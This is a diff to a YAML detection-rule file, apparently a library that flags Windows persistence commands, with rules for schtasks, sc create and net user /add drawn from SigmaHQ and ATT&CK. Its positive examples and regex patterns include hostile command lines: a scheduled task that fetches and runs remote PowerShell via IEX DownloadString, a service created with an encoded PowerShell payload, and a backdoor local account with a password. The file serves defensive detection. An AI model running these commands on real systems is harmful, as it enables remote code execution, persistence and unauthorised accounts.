   case_sensitive: false
   strength: strong
   attack: [T1053.005]
@@ -584,12 +635,37 @@
     license: DRL-1.1
     upstream_id: f2c64357-b1d2-41b7-849f-34d2682c0fad
   rationale: >-
-    The rule's uncommon-pattern selection: a task whose action is encoded PowerShell, a hidden window, an execution
-    policy bypass, a web download or a remote HTA is persistence for a loader. Enterprise tasks run signed binaries
-    and scripts by path.
+    The strongest part of the rule's uncommon-pattern selection: a task whose action is encoded PowerShell, an IEX, a
+    web download or a remote HTA is persistence for a loader. Enterprise tasks run signed binaries and scripts by
+    path. Execution-policy bypass, hidden windows, 'start /min' and -decode are common in SCCM, Intune and GPO tasks
+    and are the separate medium entry.
   examples:
     positive:
       - 'schtasks /create /sc minute /mo 30 /tn "GoogleUpdateTaskMachine" /tr "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.7/u'')" /ru system'
+    negative:
+      - 'schtasks /create /tn "Corp\Inventory" /tr "C:\Program Files\Corp\inventory.exe" /sc daily /st 02:00'
+      - 'schtasks /query /fo LIST /v'
+
+- id: mention.persist_schtasks_bypass_hidden_action
+  title: schtasks /create text with an execution-policy bypass, hidden window, start /min or -decode
+  match:
+    anchored: 'schtasks(?:\.exe)?["'']? [^\n]{0,40}/create [^\n]{1,300}(?: -w hidden | -windowstyle hidden | bypass |/c start /min | -decode )'
+  case_sensitive: false
+  strength: medium
+  attack: [T1053.005]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Command Patterns In Scheduled Task Creation (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_schtasks_susp_pattern.yml
+    license: DRL-1.1
+    upstream_id: f2c64357-b1d2-41b7-849f-34d2682c0fad
+  rationale: >-
+    The rest of the rule's uncommon-pattern selection. Loaders use these options to stay out of sight, but SCCM,
+    Intune and Group Policy tasks run 'powershell -ExecutionPolicy Bypass -File' every day, so it is medium; the
+    script path and the account decide.
+  examples:
+    positive:
+      - 'schtasks /create /sc minute /mo 5 /tn Updater /tr "powershell -w hidden -nop -File C:\Users\Public\u.ps1" /ru system'
     negative:
       - 'schtasks /create /tn "Corp\Inventory" /tr "C:\Program Files\Corp\inventory.exe" /sc daily /st 02:00'
       - 'schtasks /query /fo LIST /v'
@@ -608,8 +684,9 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1543.003
   rationale: >-
-    'sc create X binpath= "cmd /c ..."' is how PsExec-style lateral movement and loaders run commands as services.
-    Installers register real service binaries under Program Files, but a few wrap scripts, so it is medium.
+    Shape quoted in an ATT&CK procedure example (STARWHALE: 'sc create ... binpath= "cmd.exe /c ..."'). 'sc create X
+    binpath= "cmd /c ..."' is how PsExec-style lateral movement and loaders run commands as services. Installers
+    register real service binaries under Program Files, but a few wrap scripts, so it is medium.
   examples:
     positive:
       - 'sc \\10.0.0.12 create upd binpath= "cmd.exe /c powershell -enc SQBFAFgA" start= auto'
@@ -641,12 +718,12 @@
       - 'Get-CimInstance Win32_Service | Where-Object State -eq Running'
 
 - id: mention.persist_net_user_add
-  title: Local account created with net user /add
+  title: 'net user ... /add command text'
   match:
     anchored: 'net user [^\n]{1,100}/add\b'
   case_sensitive: false
   strength: medium
-  attack: [T1136.001]
+  attack: [T1136.001, T1136.002]
   telemetry: [windows_text]
   source:
     name: 'SigmaHQ: New User Created Via Net.EXE (Endgame, JHasenbusch, oscd.community)'
@@ -655,7 +732,8 @@
     upstream_id: cd219ff3-fa99-45d4-8380-a7d15116c6dc
   rationale: >-
     Creating a local account from the command line is a backdoor-account step; help desks also do it, so it is medium
-    as upstream. The account name and the next step (added to Administrators) decide.
+    as upstream. With /domain the account is a domain account (T1136.002). The account name and the next step
+    (Administrators membership) decide.
   examples:
     positive:
       - 'net user support_tmp P@ssw0rd123! /add'
@@ -664,7 +742,7 @@
       - 'net use Z: \\fileserver\share /persistent:no'
 
 - id: mention.persist_local_admins_add
-  title: Account added to the local Administrators group
+  title: 'net localgroup administrators ... /add command text'
   match:
     anchored: 'localgroup {1,3}administrators {1,3}[^\n]{1,80}/add\b'
   case_sensitive: false
